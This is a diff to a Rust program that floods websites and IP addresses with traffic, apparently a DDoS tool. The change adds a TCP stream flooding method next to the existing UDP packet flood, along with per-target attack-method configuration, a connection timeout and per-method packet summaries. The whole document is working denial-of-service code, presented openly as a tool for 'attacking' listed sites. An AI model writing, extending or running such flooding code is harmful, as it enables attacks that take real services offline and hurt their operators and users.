@@ -4,6 +4,9 @@ extern crate log;
 extern crate pretty_env_logger;
 
 use std::collections::HashMap;
+use std::io::Write;
+use std::net::TcpStream;
+use std::str::FromStr;
 use std::{
     fmt::{Debug, Display, Formatter},
     fs::File,
@@ -31,6 +34,8 @@ struct Config {
     default_ports: Vec<String>,
     unreachable_stop_trying: bool,
     summary: bool,
+    default_attack_methods: Vec<AttackMethod>,
+    tcp_connection_timeout: Duration,
 }
 
 impl Config {
@@ -56,6 +61,11 @@ impl Config {
 
         // Default for showing summary - true
         let mut summary = true;
+
+        let mut default_attack_methods = vec![];
+
+        // Default tcp connection timeout - 5 seconds
+        let mut tcp_connection_timeout = 5;
 
         for config_line in config_lines.flatten() {
             if config_line.is_empty() || config_line.trim().starts_with("//") {
@@ -104,14 +114,29 @@ impl Config {
                             }
                         }
                     }
+                    "default_attack_methods" => {
+                        while let Some(attack_method) = split.next() {
+                            default_attack_methods.push(AttackMethod::from_str(attack_method)?)
+                        }
+                    }
+                    "tcp_connection_timeout" => {
+                        if let Some(t_c_t) = split.next() {
+                            tcp_connection_timeout = t_c_t.parse()?;
+                        }
+                    }
                     _ => {}
                 }
             }
         }
 
         // Default port if not set - 80
-        if default_ports.len() == 0 {
+        if default_ports.is_empty() {
             default_ports.push("80".to_string());
+        }
+
+        // Default attack method if not set - UDP
+        if default_attack_methods.is_empty() {
+            default_attack_methods.push(AttackMethod::Udp);
         }
 
         let config = Config {
@@ -121,6 +146,8 @@ impl Config {
             default_ports,
             unreachable_stop_trying,
             summary,
+            default_attack_methods,
+            tcp_connection_timeout: Duration::from_secs(tcp_connection_timeout),
         };
 
         info!("Loaded config: {}", config);
@@ -133,17 +160,63 @@ impl Display for Config {
     fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
         write!(
             f,
-            "Config {{ execution_time: {}s, timeout: {}ms, packet_size: {} bytes, default_ports: [{}], unreachable_stop_trying: {}, summary: {} }}",
+            "Config {{ execution_time: {}s, timeout: {}ms, packet_size: {} bytes, default_ports: [{}], unreachable_stop_trying: {}, summary: {}, default_attack_methods: [{}], tcp_connection_timeout: {} }}",
             self.execution_time,
             self.timeout.as_millis(),
             self.packet_size,
             self.default_ports.join(", "),
             self.unreachable_stop_trying,
-            self.summary
+            self.summary,
+            self.default_attack_methods.iter().map(|attack_method| attack_method.to_str()).join(", "),
+            self.tcp_connection_timeout.as_secs()
         )
     }
 }
 // ----- Attack Config END -----
+
+// ----- Attack Method START -----
+#[derive(Copy, Clone, Eq, PartialEq, Hash)]
+enum AttackMethod {
+    Udp,
+    Tcp,
+}
+
+impl AttackMethod {
+    pub fn to_str(&self) -> String {
+        match self {
+            AttackMethod::Udp => "udp".to_string(),
+            AttackMethod::Tcp => "tcp".to_string(),
+        }
+    }
+
+    pub fn from_str(rhs: &str) -> Result<Self> {
+        match rhs.to_lowercase().as_str() {
+            "udp" => Ok(AttackMethod::Udp),
+            "tcp" => Ok(AttackMethod::Tcp),
+            _ => bail!("Not implemented method!"),
+        }
+    }
+}
+
+impl Default for AttackMethod {
+    fn default() -> Self {
+        AttackMethod::Udp
+    }
+}
+
+impl Display for AttackMethod {
+    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
+        write!(
+            f,
+            "{}",
+            match self {
+                AttackMethod::Udp => "udp",
+                AttackMethod::Tcp => "tcp",
+            }
+        )
+    }
+}
+// ----- Attack Method END -----
 
 // ----- Website Configuration START -----
 #[derive(Clone)]
@@ -151,6 +224,7 @@ struct WebsiteConfig {
     pub address: String,
     pub ports: Vec<String>,
     pub is_domain: bool,
+    pub attack_methods: Vec<AttackMethod>,
 }
 
 impl WebsiteConfig {
@@ -191,29 +265,49 @@ impl WebsiteConfig {
             };
 
             if let Some(address) = split.next() {
+                let mut attack_methods = vec![];
                 let mut ports = vec![];
+
+                while let Some(next) = split.next() {
+                    match next.to_lowercase().as_str() {
+                        "udp" => attack_methods.push(AttackMethod::Udp),
+                        "tcp" => attack_methods.push(AttackMethod::Tcp),
+                        _ => {
+                            ports.push(next.to_string());
+                            break;
+                        }
+                    }
+                }
 
                 while let Some(port) = split.next() {
                     ports.push(port.to_string());
                 }
 
-                if ports.len() == 0 {
+                if attack_methods.is_empty() {
+                    attack_methods = config.default_attack_methods.clone();
+                }
+
+                if ports.is_empty() {
                     ports = config.default_ports.clone();
                 }
 
                 for port in ports.iter() {
-                    info!(
-                        "Found {} {} with port {}",
-                        if is_domain { "domain" } else { "ip" },
-                        address,
-                        port
-                    );
+                    for attack_method in attack_methods.iter() {
+                        info!(
+                            "Found {} {} with port {} and {} method of attack",
+                            if is_domain { "domain" } else { "ip" },
+                            address,
+                            port,
+                            attack_method.to_str().to_uppercase()
+                        );
+                    }
                 }
 
                 return Some(WebsiteConfig {
                     address: address.to_string(),
                     ports,
                     is_domain,
+                    attack_methods,
                 });
             }
 
@@ -228,15 +322,24 @@ impl Debug for WebsiteConfig {
     fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
         let spacing = if self.is_domain { " " } else { "" };
 
-        write!(
-            f,
-            "[{}]",
-            self.ports
-                .iter()
-                .map(|port| format!("{}{}:{}{}", self.address, spacing, spacing, port))
-                .collect::<Vec<_>>()
-                .join(", ")
-        )
+        let mut output = vec![];
+
+        for port in self.ports.iter() {
+            for attack_method in self.attack_methods.iter() {
+                output.push(format!(
+                    "{}{}:{}{}{}/{}{}",
+                    self.address,
+                    spacing,
+                    spacing,
+                    port,
+                    spacing,
+                    spacing,
+                    attack_method.to_str()
+                ));
+            }
+        }
+
+        write!(f, "[{}]", output.join(", "))
     }
 }
 // ----- Website Configuration END -----
@@ -280,36 +383,52 @@ impl PacketSummary {
 
 // ----- Attack Websites START -----
 struct Attacker {
-    pub config: Config,
-    pub website_configs: Vec<WebsiteConfig>,
-    pub summary: Arc<Mutex<HashMap<String, PacketSummary>>>,
+    config: Config,
+    website_configs: Vec<WebsiteConfig>,
+    summary: Arc<Mutex<HashMap<String, HashMap<AttackMethod, PacketSummary>>>>,
 }
 
 impl Attacker {
+    pub fn new() -> Result<Self> {
+        let config = Config::load()?;
+        let website_configs = WebsiteConfig::load_configs(&config)?;
+
+        Ok(Self {
+            config,
+            website_configs,
+            summary: Arc::new(Mutex::new(HashMap::new())),
+        })
+    }
+
     pub fn attack_websites(&self) {
-        info!("Starting attack on the websites...");
-
-        let start = Instant::now();
-
         let socket_addresses = Arc::new(Mutex::new(vec![]));
 
         self.website_configs.par_iter().for_each(|website_config| {
             if !website_config.is_domain {
                 website_config.ports.par_iter().for_each(|port| {
-                    (*socket_addresses).lock().unwrap().push(format!(
-                        "{}:{}",
-                        website_config.address,
-                        port.clone()
-                    ));
+                    website_config
+                        .attack_methods
+                        .par_iter()
+                        .for_each(|attack_method| {
+                            (*socket_addresses).lock().unwrap().push((
+                                format!("{}:{}", website_config.address, port.clone()),
+                                attack_method,
+                            ));
+                        });
                 });
             } else {
                 if let std::result::Result::Ok(ips) = lookup_host(&website_config.address) {
                     ips.par_iter().for_each(|ip| {
                         website_config.ports.par_iter().for_each(|port| {
-                            (*socket_addresses)
-                                .lock()
-                                .unwrap()
-                                .push(format!("{}:{}", ip, port));
+                            website_config
+                                .attack_methods
+                                .par_iter()
+                                .for_each(|attack_method| {
+                                    (*socket_addresses)
+                                        .lock()
+                                        .unwrap()
+                                        .push((format!("{}:{}", ip, port), attack_method));
+                                });
                         });
                     });
                 } else {
@@ -329,81 +448,159 @@ impl Attacker {
             .unique()
             .collect::<Vec<_>>();
 
-        socket_addresses.par_iter().for_each(|socket_address| {
-            let sender: SocketAddr = format!(
-                "0.0.0.0:{}",
-                pick_unused_port().expect("No free port found!")
-            )
-            .parse()
-            .expect("Couldn't get sender IP address");
+        let start = Instant::now();
 
-            info!("Creating socket for {} ...", sender);
+        info!("Starting attack on the websites...");
 
-            let socket =
-                UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
+        socket_addresses
+            .par_iter()
+            .for_each(|(socket_address, attack_method)| {
+                let sender: SocketAddr = format!(
+                    "0.0.0.0:{}",
+                    pick_unused_port().expect("No free port found!")
+                )
+                .parse()
+                .expect("Couldn't get sender IP address");
 
-            let mut summary_added = false;
+                info!(
+                    "Attacking {} with {} method",
+                    socket_address,
+                    attack_method.to_str().to_uppercase()
+                );
 
-            while start.elapsed().as_secs() < self.config.execution_time {
-                match socket.connect(socket_address.clone()) {
-                    std::result::Result::Ok(_) => {
-                        if self.config.summary && !summary_added {
-                            summary_added = true;
+                match attack_method {
+                    AttackMethod::Udp => self.attack_udp(start, sender, socket_address),
+                    AttackMethod::Tcp => self.attack_tcp(start, socket_address),
+                }
+            });
 
-                            (*self.summary)
-                                .lock()
-                                .unwrap()
-                                .insert(socket_address.clone(), PacketSummary::default());
-                        }
+        if self.config.summary {
+            self.show_summary()
+        }
+    }
 
-                        let buffer = self.generate_buffer();
+    fn attack_udp(&self, start: Instant, sender: SocketAddr, socket_address: &String) {
+        let attack_method: AttackMethod = AttackMethod::Udp;
+        let attack_method_str: String = attack_method.to_str().to_uppercase();
 
-                        let res = socket.send(buffer.as_slice());
+        let mut summary_added = false;
 
-                        match res {
-                            std::result::Result::Ok(size) => {
-                                info!(
-                                    "Successfully sent a packet of size {} to {}",
-                                    size, socket_address
-                                );
+        info!("Creating socket for {} ...", sender);
+        let socket = UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
 
-                                if self.config.summary {
-                                    if let Some(summary) =
-                                        (*self.summary).lock().unwrap().get_mut(socket_address)
-                                    {
-                                        summary.size += size as u128;
-                                        summary.amount += 1;
-                                    }
-                                }
-                            }
-                            std::result::Result::Err(error) => {
-                                error!(
-                                    "Failed to send a packet to {} .\nError message: {}",
-                                    socket_address, error
-                                );
+        let buffer = self.generate_buffer();
 
-                                if self.config.unreachable_stop_trying {
-                                    break;
-                                }
-                            }
-                        }
+        while start.elapsed().as_secs() < self.config.execution_time {
+            match socket.connect(socket_address.clone()) {
+                std::result::Result::Ok(_) => {
+                    if self.config.summary && !summary_added {
+                        summary_added = true;
 
-                        sleep(self.config.timeout);
+                        self.add_to_summary(socket_address.clone(), attack_method);
                     }
-                    std::result::Result::Err(error) => {
-                        error!(
-                            "Couldn't connect to {}.\nError message: {}",
-                            socket_address, error
-                        );
 
+                    match socket.send(buffer.as_slice()) {
+                        std::result::Result::Ok(size) => {
+                            info!(
+                                "Successfully sent a packet of size {} to {} using {} method",
+                                size, socket_address, attack_method_str
+                            );
+
+                            self.update_summary(
+                                socket_address.clone(),
+                                attack_method,
+                                size as u128,
+                            );
+                        }
+                        std::result::Result::Err(error) => {
+                            error!(
+                                "Failed to send a packet to {} using {} method.\nError message: {}",
+                                socket_address, attack_method_str, error
+                            );
+
+                            if self.config.unreachable_stop_trying {
+                                break;
+                            }
+                        }
+                    }
+
+                    sleep(self.config.timeout);
+                }
+                std::result::Result::Err(error) => {
+                    error!(
+                        "Couldn't connect to {} using {} method.\nError message: {}",
+                        socket_address, attack_method_str, error
+                    );
+
+                    break;
+                }
+            }
+        }
+    }
+
+    fn attack_tcp(&self, start: Instant, socket_address: &String) {
+        let attack_method: AttackMethod = AttackMethod::Tcp;
+        let attack_method_str: String = AttackMethod::Tcp.to_str().to_uppercase();
+
+        let mut stream: TcpStream;
+
+        info!("Creating TcpStream to {}", socket_address);
+
+        let socket_addr = SocketAddr::from_str(socket_address.as_str());
+
+        if socket_addr.is_err() {
+            error!(
+                "Couldn't create a socket address out of {}.\nError message: {}",
+                socket_address,
+                socket_addr.err().unwrap()
+            );
+
+            return;
+        }
+
+        match TcpStream::connect_timeout(&socket_addr.unwrap(), self.config.tcp_connection_timeout)
+        {
+            std::result::Result::Ok(s) => {
+                info!("Successfully connected stream to remote host!");
+
+                stream = s;
+
+                if self.config.summary {
+                    self.add_to_summary(socket_address.clone(), attack_method);
+                }
+            }
+            Err(error) => {
+                error!(
+                    "Couldn't connect TCP stream to {} using {} method.\nError message: {}",
+                    socket_address, attack_method_str, error
+                );
+                return;
+            }
+        }
+
+        let buffer = self.generate_buffer();
+
+        while start.elapsed().as_secs() < self.config.execution_time {
+            match stream.write(buffer.as_slice()) {
+                std::result::Result::Ok(size) => {
+                    info!(
+                        "Successfully sent a packet of size {} to {} using {} method",
+                        size, socket_address, attack_method_str
+                    );
+
+                    self.update_summary(socket_address.clone(), attack_method, size as u128);
+                }
+                std::result::Result::Err(error) => {
+                    error!(
+                        "Failed to send a packet to {} using {} method.\nError message: {}",
+                        socket_address, attack_method_str, error
+                    );
+
+                    if self.config.unreachable_stop_trying {
                         break;
                     }
                 }
             }
-        });
-
-        if self.config.summary {
-            self.show_summary()
         }
     }
 
@@ -418,16 +615,44 @@ impl Attacker {
         buffer
     }
 
+    fn add_to_summary(&self, socket_address: String, attack_method: AttackMethod) {
+        let mut summary = (*self.summary).lock().unwrap();
+
+        if let Some(socket_summary) = summary.get_mut(&socket_address) {
+            socket_summary.insert(attack_method, PacketSummary::default());
+        } else {
+            summary.insert(socket_address.clone(), {
+                let mut socket_summary = HashMap::new();
+                socket_summary.insert(attack_method, PacketSummary::default());
+
+                socket_summary
+            });
+        }
+    }
+
+    fn update_summary(&self, socket_address: String, attack_method: AttackMethod, size: u128) {
+        if self.config.summary {
+            if let Some(summary) = (*self.summary).lock().unwrap().get_mut(&socket_address) {
+                if let Some(socket_summary) = summary.get_mut(&attack_method) {
+                    socket_summary.size += size;
+                    socket_summary.amount += 1;
+                }
+            }
+        }
+    }
+
     fn show_summary(&self) {
         info!("~~~~~~~ Attack Summary START ~~~~~~~");
         let mut sum_packets = 0;
         let mut sum_packet_size = 0;
 
-        for (socket_address, packet_summary) in (*self.summary).lock().unwrap().iter() {
-            sum_packets += packet_summary.amount;
-            sum_packet_size += packet_summary.size;
+        for (socket_address, socket_summary) in (*self.summary).lock().unwrap().iter() {
+            for (_, packet_summary) in socket_summary.iter() {
+                sum_packets += packet_summary.amount;
+                sum_packet_size += packet_summary.size;
 
-            packet_summary.show(socket_address);
+                packet_summary.show(socket_address);
+            }
         }
 
         info!(
@@ -454,15 +679,7 @@ fn main() -> Result<()> {
         return Ok(());
     }
 
-    let config = Config::load()?;
-    let website_configs = WebsiteConfig::load_configs(&config)?;
-
-    let attacker = Attacker {
-        config,
-        website_configs,
-        summary: Arc::new(Mutex::new(HashMap::new())),
-    };
-
+    let attacker = Attacker::new()?;
     attacker.attack_websites();
 
     Ok(())
